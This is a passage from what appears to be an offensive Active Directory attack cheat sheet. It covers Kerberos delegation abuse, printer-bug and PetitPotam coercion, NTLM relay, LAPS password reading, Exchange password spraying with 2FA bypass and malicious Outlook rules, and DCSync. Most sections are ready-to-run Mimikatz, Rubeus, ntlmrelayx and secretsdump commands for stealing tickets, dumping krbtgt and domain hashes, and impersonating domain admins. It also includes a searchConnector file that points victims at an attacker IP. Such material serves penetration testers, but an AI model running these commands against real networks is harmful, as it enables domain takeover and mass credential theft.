.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c <SHARE>\<EXECUTABLE FILE>" --GPOName "<GPO>"
```

## Delegation
- In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
- In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them.

### Unconstrained Delegation
- To execute attack owning the server with unconstrained delegation is required!

#### Discover domain users which have unconstrained delegation
```
Get-DomainUser | Where-Object -Property useraccountcontrol -Match TRUSTED_FOR_DELEGATION 
```

#### Discover domain computers which have unconstrained delegation
- Domain Controllers always show up, ignore them
```
Get-DomainComputer -UnConstrained
Get-DomainComputer -UnConstrained | select samaccountname
```

### Unconstrained delegation computer
#### Check if any DA tokens are available on the unconstrained machine
- Wait for a domain admin to login while checking for tokens
```
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

```
.\Rubeus.exe triage
```

#### Export the TGT ticket
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

```
.\Rubeus.exe dump /luid:<LUID> /service:<SERVICE>
```

#### Reuse the TGT ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
```

```
.\Rubeus.exe ptt /ticket:<TICKET FILE>
```

#### Check access on target machine
```
ls \\<FQDN>\c$
Enter-PSSession -ComputerName <FQDN>
 .\PsExec64.exe \\<COMPUTERNAME> cmd
```

#### Run DCSync to get credentials:
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

### Printer bug
- A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.
- Can be chained together with [S4Uself](Lateral-Movement.md#S4U2self)
- https://github.com/leechristensen/SpoolSample

#### Check if spool server is running
```
#Edit IP at the bottom
spoolerscan.ps1
```

```
ls \\<DC>\pipe\spoolss
```

#### Listen with rubeus for incoming tickets
- Requires running as system!
- https://powershell-guru.com/powershell-tip-53-run-powershell-as-system/
```
.\Rubeus.exe monitor /interval:5 /nowrap
```

#### Force authentication of the DC
- https://github.com/leechristensen/SpoolSample
- https://github.com/cube0x0/SharpSystemTriggers
```
.\SpoolSample.exe <DC FQDN> <TARGET SERVER WITH DELEGATION>

.\SharpSpoolTrigger.exe <DC FQDN> <TARGET SERVER WITH DELEGATION>
```

#### Import the ticket
- Paste the ticket from previous command
```
.\Rubeus.exe ptt /ticket:<TICKET>
```

#### Run DCSync to get credentials:
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

### Unconstrained delegation User
- Requires a user with unconstrained delegation and a SPN set which points to the attacker (or attacker controlled machine).
	- A user with unconstrained delegation 
	- User should have a SPN which doesn't point to a valid dns record - or it needs to point to a machine under your control - or able to set spn & create DNS record
- https://exploit.ph/user-constrained-delegation.html

#### Check User attributes
```
Get-Domainuser <USER> | select-object samaccountname, serviceprincipalname, useraccountcontrol
```

#### Set SPN for user
```
Set-DomainObject -Identity <USER> -Set @{serviceprincipalname='cifs/<HOSTNAME>.<DOMAIN>'}
```

#### Create a DNS record pointing to the attacker's machine IP
-   https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
-   https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
- When the tools throw errors like `NoSuchObject` try the `--legacy` or `--forest` with `dnstool.py` or the `-Partition` parameter from PowerMad.
```
dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>

Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> -Realm <DOMAIN>
```

#### Calculate RC4 hash for the user
```
./Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
```

#### Setup krbrelayx
- Will save the ticket to disk after executing printerbug
- https://github.com/dirkjanm/krbrelayx
```
sudo python3 /opt/windows/krbrelayx/krbrelayx.py -hashes :<HASH>
```

#### Trigger target to authenticate to attacker machine
- Use hostname we created in the DNS record
- https://github.com/topotam/PetitPotam
- https://github.com/dirkjanm/krbrelayx
```
python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME>.<DOMAIN>

python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME>.<DOMAIN> <TARGET>
```

#### Use TGT ticket and exploit
```
export KRB5CCNAME=<FILE>.ccache
python3 Psexec.py -k -no-pass <TARGET FQDN>
python3 Secretsdump.py -k <TARGET FQDN>
```

### Constrained Delegation
- To execute attack owning the user or server with constrained delegation is required.

#### Enumerate users with contrained delegation enabled
```
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

#### Enumerate computers with contrained delegation enabled
```
Get-Domaincomputer -TrustedToAuth
Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

### Constrained delegation User
#### Rubeus calculate password hash
- If only password is available calculate the hash
```
.\Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
```

#### Check for user to impersonate
```
Get-DomainUser | Where-Object {!($_.memberof -match "Protected Users")} | Where-Object {$_.useraccountcontrol -notmatch "NOT_DELEGATED"}
```

#### Rubeus request and inject TGT + TGS
- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right. 
- Make sure they are local admin on the target machine.
```
.\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:<USER> /domain:<DOMAIN> /msdsspn:<SERVICE ALLOWED TO DELEGATE>/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
```

#### Check access on target machine
```
ls \\<FQDN>\c$
Enter-PSSession -ComputerName <FQDN>
 .\PsExec64.exe \\<COMPUTERNAME> cmd
```

#### Run DCSync to get credentials:
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

### Constrained delegation Computer
#### Dump TGT of computeraccount
```
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:<LUID> /service:<SERVICE> /nowrap
```

#### Rubeus request and inject TGT + TGS
- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /aes256:<AES HASH> /opsec /altservice:<SECOND SERVICE> /ptt 
.\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /rc4:<NTLM> /altservice:<SECOND SERVICE> /ptt 
```

#### Check access on target machine
```
ls \\<FQDN>\c$
Enter-PSSession -ComputerName <FQDN>
 .\PsExec64.exe \\<COMPUTERNAME> cmd
```

#### Run DCSync to get credentials:
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

### Resource Based Constrained Delegation
#### Check if there are computers with RBCD configured
- If you own the object that has RBCD you can own the target object
```
Get-DomainComputer | Where-Object -Property msds-allowedtoactonbehalfofotheridentity | Select-Object samaccountname, msds-allowedtoactonbehalfofotheridentity
```

#### Check to where it is refering too
```
$RawBytes = Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
Get-DomainObject <SID>
```

### Computer object takeover
- Requirements:
  - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
  - A user with write privileges over the target computer which doesn't have msds-AllowedToActOnBehalfOfOtherIdentity
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

#### Check if domain controller is atleast Windows Server 2012
```
Get-DomainController
```

#### Check if target doesn't have msds-AllowedToActOnBehalfOfOtherIdentity
```
Get-DomainComputer <COMPUTERNAME> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

#### Get access to a user or computer with SPN set
- If not already owned a user or computer with a SPN, Create a computer object!

#### Check who can add computers to the domain
```
(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name

Get-DomainObject | Where-Object ms-ds-machineaccountquota | select-object ms-ds-machineaccountquota
```

#### Create a new computer object
- https://github.com/Kevin-Robertson/Powermad
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
```
Import-Module Powermad.ps1 
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
```

#### Get the object SID
- If already had a user with SPN use that user, otherwise use the computer you made!
```
Get-DomainComputer FAKE01
Get-DomainUser <USER>
```

#### Creata a new raw security descriptor
- Use the SID from previous command
``` 
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

#### Modify the target computer object
```
Get-DomainComputer <TARGET COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

#### Check if modification worked
```
Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

#### Check if raw security descriptor is refering to the correct machine
```
$RawBytes = Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
Get-DomainComputer <SID>
```

#### Calculate RC4 hash for the user/computer object
- Only if you made a computer or you dont know the hash of the user
```
.\Rubeus.exe hash /password:123456 /user:fake01 /domain:<DOMAIN>
```

#### Select user to impersonate
- Preferably a user that would be admin on the machine (Check BloodHound).
- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
```
Get-DomainUser | Where-Object {!($_.memberof -match "Protected Users")} | Where-Object {$_.useraccountcontrol -notmatch "NOT_DELEGATED"}
```

#### Impersonate another user (For example DA)
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:cifs/<TARGET COMPUTER> /ptt

.\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:host/<TARGET COMPUTER> /altservice:ldap,rpc,http,cifs,host /ptt
```

#### Access the C Disk if user is local admin to the target machine (When impersonating DA)
```
dir \\<COMPUTER>\C$
```

#### It is possible that you impersonated another user which leads to more ACL abuses!

### Webclient Attack
- Requirements:
  - On a Domain Controller to have the LDAP signing or LDAPS binding not enforced (default value)
  - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity). OneDrive, SharePoint and NextCloud also activate this on clients.
  - A DNS record pointing to the attacker’s machine (By default authenticated users can create records)
- https://www.bussink.net/rbcd-webclient-attack/
- The blog says this is a requirement but it isn't "On a Domain Controller to have the LDAPS channel binding not required (default value)". You can relay to LDAP and use your own object with a SPN or relay to LDAPS and it will create it. If LDAP or use a specific user use the ```--escalate-user``` flag.

#### Check who can add computers to the domain
- If not already owning an account with SPN
```
(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name

Get-DomainObject | Where-Object ms-ds-machineaccountquota

crackmapexec ldap <DC FQDN> -d <DOMAIN> -u <USER> -p <PASS> -M maq
```

#### Check LDAP Signing and LDAPS Binding
- https://github.com/zyn3rgy/LdapRelayScan
```
python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>

cme ldap <DC IP> -u <USER> -p <PASSWORD> -M ldap-checker
```

#### Scan for target with webclient active
- https://github.com/Hackndo/WebclientServiceScanner
```
webclientservicescanner <DOMAIN>/<USER>:<PASSWORD>@<IP RANGE> -dc-ip <DC IP>

crackmapexec smb <HOST> -d <DOMAIN> -u <USER> -p <PASSWORD> -M webdav
```

#### If no targets, place file on share to activate webclients
- https://www.bussink.net/webclient_activation/
- Filename ```Documents.searchConnector-ms```
```
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>//<ATTACKER IP>/test.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>//<ATTACKER IP>/test</url>
    </simpleLocation>
</searchConnectorDescription>
```

#### If got shell on target, activate webclient
- https://github.com/eversinc33/SharpStartWebclient

#### Create a DNS record pointing to the attacker's machine IP
- https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
- https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
- When the tools throw errors like `NoSuchObject` try the `--legacy` or `--forest` with `dnstool.py` or the `-Partition` parameter from PowerMad.
```
dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>

$creds = get-credential
Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
```

#### Create a new computer object
- If not already owning an account with SPN
- https://github.com/Kevin-Robertson/Powermad
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
```
import-module Powermad.ps1 
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
```

#### Start NTLMRelay
- Or use `ldaps://<DC IP>` if it doesn't require binding and ldap requires signing
```
sudo ntlmrelayx.py -t ldap://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
```

#### Trigger target to authenticate to attacker machine
- Use hostname we created in the DNS record
- https://github.com/topotam/PetitPotam
- https://github.com/dirkjanm/krbrelayx
```
python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@8080/a <TARGET>

python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@8080/a
```

#### Select user to impersonate
- Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
```
Get-DomainUser | Where-Object {!($_.memberof -match "Protected Users")} | Where-Object {$_.useraccountcontrol -notmatch "NOT_DELEGATED"}
```

#### Impersonate any user and exploit
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
```
getST.py <DOMAIN>/FAKE01@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
export KRB5CCNAME=administrator.ccache
python3 Psexec.py -k -no-pass <TARGET FQDN>
python3 Secretsdump.py -k <TARGET FQDN>
```

### Change lockscreen
- Requirements:
  - Low priv shell on a machine
  - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity). OneDrive, SharePoint and NextCloud also activate this on clients.
  - A DNS record pointing to the attacker’s machine (By default authenticated users can create records)
- https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/

#### Check who can add computers to the domain
- If not already owning an account with SPN
```
(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name

Get-DomainObject | Where-Object ms-ds-machineaccountquota

cme ldap <DC IP> -d <DOMAIN> -u <USER> -p <PASS> -M maq
```

#### Create a new computer object
- https://github.com/Kevin-Robertson/Powermad
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
- If not already owning an account with SPN
```
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
```

#### Create a DNS record pointing to the attacker's machine IP
- https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
- https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
- When the tools throw errors like `NoSuchObject` try the `--legacy` or `--forest` with `dnstool.py` or the `-Partition` parameter from PowerMad.
```
dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>

$creds = get-credential
Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
```
- Didn't test dnstool for this attack

#### Start NTLMRelay
- Or use `ldaps://<DC IP>` if it doesn't require binding and ldap requires signing
```
sudo python3 ntlmrelayx.py -t ldap://<DC> --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg --http-port 8080
```

#### Change lockscreen image
- https://github.com/nccgroup/Change-Lockscreen
```
change-lockscreen -webdav \\webdav@8080\
```

#### Impersonate any user
```
getST.py <DOMAIN>/FAKE01@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
export KRB5CCNAME=administrator.ccache
Psexec.py -k -no-pass <TARGET FQDN>
```

## LAPS
- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
- Another great tool to use: https://github.com/leoloobeek/LAPSToolkit

#### Check if LAPS is installed on local computer
```
Get-Childitem 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
```

### Check existence of LAPS in the domain
#### Check for existence of the ms-mcs-admpwd attribute
```
Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
```

#### Check for computers with LAPS installed
```
Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
```

#### Check for GPO's with LAPS in its name
```
Get-DomainGPO -Identity *LAPS*
```

#### Check for OU's with LAPS
```
Get-DomainOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID; $_ }
```

#### Check which computers is part of the OU
```
Get-DomainOU -OUName <NAME> | %{Get-DomainComputer -ADSpath $_}
```

#### Check to which computers the LAPS GPO is applied to
```
Get-DomainOU -GPLink "<Distinguishedname from GET-DOMAINGPO>" | select name, distinguishedname
Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname
```

#### Check all computers without LAPS
```
Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime -like $null | select-object samaccountname
```

#### Check the LAPS configuration
- https://github.com/PowerShell/GPRegistryPolicy
- Password complexity, password length, password expiration, Acccount managing LAPS
- AdmPwdEnabled 1 = local administrator password is managed
- Passwordcomplexity 1 = large letters, 2 = large + small letters, 3 = Large + small + numbers, 4 = large + small + numbers + specials
```
Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
```

#### Find all users who can read passwords in clear text machines in OU's
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | Select-Object ObjectDN, IdentityName
```

```
Import-Module AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

#### If retured groups, get the users:
```
$LAPSAdmins = Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
$LAPSAdmins += Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
$LAPSAdmins | select Name, distinguishedName | sort name -Unique | fortmat-table -auto
```

#### Read clear-text passwords:
```
Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd

#LAPS Powershell cmdlet
Get-AdmPwdPassword -ComputerName <MACHINE NAME>
```

## MS Exchange
- Outlook rules and Outlook Forms are synced to all clients with the mailbox active.
- Outlook Forms VBSCript engine is different then the VBA Macro script engine (So disabling macro's wont defend against it)

### Attacking externally
- Attah path could be: Reconnaissance --> OWA Discovery --> Internal Domain Discovery --> Naming scheme fuzzing --> Username enumeration --> Password discovery --> GAL Extraction --> More Password discovery --> 2fa bypass --> Remote Access through VPN/RDP / Malicious Outlook Rules or Forms / Internal Phishing

#### Collection of data (OSINT)
- Collect e-mail adresses, usernames, passwords, get the email/user account naming scheme with tools such as:
  - https://github.com/mschwager/fierce
  - https://www.elevenpaths.com/innovation-labs/technologies/foca
  - https://github.com/lanmaster53/recon-ng
  - https://github.com/leebaird/discover
  - https://github.com/laramies/theHarvester

#### Domain name discovery
- https://github.com/dafthack/MailSniper
```
Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME>
Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME> -OutFile <POTENTIAL_DOMAINS.TXT> -CompanyName "TARGET NAME"
```
- Internal Domain name may be found inside a SSL Certificate

#### Name scheme fuzzing
- Create a username list from the OSINT
- Could use https://github.com/dafthack/EmailAddressMangler to generate mangled username list
```
Invoke-EmailAddressMangler -FirstNamesList <TXT> -LastNameList <TXT> -AddresConvention fnln | Out-File -Encoding ascii possible-usernames.txt
```

- https://gist.github.com/superkojiman/11076951
```
/opt/namemash.py names.txt >> possible-usernames.txt
```

#### Username Enumeration
- https://github.com/dafthack/MailSniper
```
Invoke-UsernameHarvestOWA -Userlist possible-usernames.txt -ExchHostname <EXCH HOSTNAME> -DOMAIN <IDENTIFIED INTERNAL DOMAIN NAME> -OutFile domain_users.txt
```

#### Password discovery
- https://github.com/dafthack/MailSniper
```
Invoke-PasswordSprayOWA -ExchHostname <EXCH HOSTNAME> -Userlist domain_users.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
Invoke-PasswordSprayEWS -ExchHostname <EXCH HOSTNAME> -Userlist domain_users.txt -Password <PASSWORD> -Threads 15 -Outfile ews-sprayed-creds.txt
```

#### Global Address List (GAL) Extraction
- https://els-cdn.content-api.ine.com/09f3f35f-6f69-4a9d-90be-d13046e692c0/index.html#
```
Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
```
- Then you could spray passwords again to get access to more mail accounts!

#### Bypassing 2fa
- Can check by server responses if supplied password is correct or not.
- Most 2FA vendors do not cover all available Exchange protocols. Owa might be protected but EWS might not be!

```
# Access through EWS
Invoke-SelfSearch -Mailbox <MAIL ADDRESS> -ExchHostname <DOMAIN NAME> -remote
```

#### Spreading the compromise
- Pillaging mailboxes for credentials/sensitive data
  -  https://github.com/milo2012/owaDump (--keyword option)
  -  https://github.com/dafthack/MailSniper (Invoke-SelfSearch)
  -  https://github.com/xorrior/EmailRaider (Invoke-MailSearch)
- Internal phishing
  - Mail from internal email adresses to targets.
- Malicious Outlook rules
  - Two interested options: Start application and run a script (Start application is synced through Exchange server, run a script is not)
  - Since Outlook 2016 both options are disabled by default
  - Attack prequisites:
    - Identification of valid credentials
    - Exchange Service Access (via RPC or MAPI over HTTP)
    - Malicious file dropped on disk (Through WebDAV share using UNC or local SMB share when physically inside) 
  - The attack:
    - Create a malicious executable (EXE, HTA, BAT, LNK etc.) and host it on an open WebDAV share
    - Create a malicious Outlook rule using the rulz.py script, pointing the file path to your WebDAV share
      - https://gist.github.com/monoxgas/7fec9ec0f3ab405773fc
    - Run a local Outlook instance using the target's credentials and import the malicious rule you created (File --> Manager Rules & Alerts --> Options --> Improt rules)
    - Send the trigger email. 
- Malicious Outlook Forms
  - If the path is applied that disables Run Application and Run Script rules this still works!
  - Attack prequisites:
    - Identification of valid credentials
    - Exchange service access 
  - KB4011091 for outlook 2016 seems to block VBSCript in forms
  - https://github.com/sensepost/ruler/wiki/Forms
  - ```.\ruler --email <EMAIL> form add --suffix form_name --input /tmp/command.txt --send```

### Attacking from the inside
- All the attacks from the outside works from the inside!
- https://github.com/dafthack/MailSniper

#### Enumerate all mailboxes
```
Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
```

#### Check access to mailboxes with current user
```
Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
```

#### Read e-mails
- The below command looks for terms like pass, creds, credentials from top 100 emails
```
Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
```

#### Exchange ActiveSync
- This attack applies when the DC and Exchange Server are hosted on the same machine
- https://labs.mwrinfosecurity.com/blog/accessing-internal-fileshares-through-exchange-activesync/

### MS Exchange escalating privileges
- Attack is performed cross domain, but can be done inside the domain. Just use the current domain instead of parent domain!
![afbeelding](https://user-images.githubusercontent.com/43987245/119706037-bf8d3000-be59-11eb-84cc-6568ba6e5d26.png)

#### Enumerate if exchange groups exist
```
. ./Powerview.ps1
Get-DomainGroup *exchange*
```

#### Enumerate membership of the groups
```
Get-DomainGroupMember "Organization Management"
Get-DomainGroupMember "Exchange Trusted Subsystem"
Get-DomainGroupMember "Exchange Windows Permissions"
```

#### If we have privileges of a member of the Organization Management, we can add a user to the 'Exchange Windows Permissions' group.
```
$user = Get-DomainUser -Identity <USER>
$group = Get-DomainGroup -Identity 'Exchange Windows Permissions'
Add-DomainGroupMember -Identity $group -Members $user -Verbose
```

#### Add permissions to execute DCSYNC
- When member of the ```Exchange Windows Permissions``` group
```
Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<USER>' -Rights DCSync -Verbose
```

#### Execute DCSYNC
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

#### If we have privileges of 'exchange user', who is a member of the Exchange Trusted Subsystem, we can add any user to the DNSAdmins group:
```
$user = Get-DomainUser -Identity <USER>
$group = Get-DomainGroup -Identity 'DNSAdmins'
Add-DomainGroupMember -Identity $group -Members $user -Verbose
```

### NTLM Relay MS Exchange abuse
- https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
- https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/

#### The attack using domain credentials
- https://github.com/dirkjanm/privexchange/
- Can either relay to `ldap` or `ldaps`
```
sudo python3 ntlmrelayx.py -t ldap://<DC> --escalate-user <USER>

python3 privexchange.py -ah <ATTACKER HOST> <EXCHANGE SERVER> -u Username -d <DOMAIN NAME>

secretsdump.py <DOMAIN>/<USER>@<DC IP> -just-dc
```

#### The attack without credentials
- using LLMNR/NBNS/mitm6 spoofing and https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py
```
sudo python3 ntlmrelayx.py -t https://<EXCH HOST>/EWS/Exchange.asmx
```

#### Restore ACL's with aclpwn.py
- NTLMRelayx performs acl attacks a restore file is sived that can be used to restore the ACL's

```
python3 aclpwn.py --restore aclpwn.restore
```

## Active Directory Certificate Services
- Whitepaper https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
- https://www.thehacker.recipes/ad/movement/ad-cs
- https://github.com/GhostPack/Certify
- https://github.com/ly4k/Certipy

### Enumeration
#### Find AD CS Certificate authorities (CA's)
```
Get-ADObject -Filter * -SearchBase 'CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'

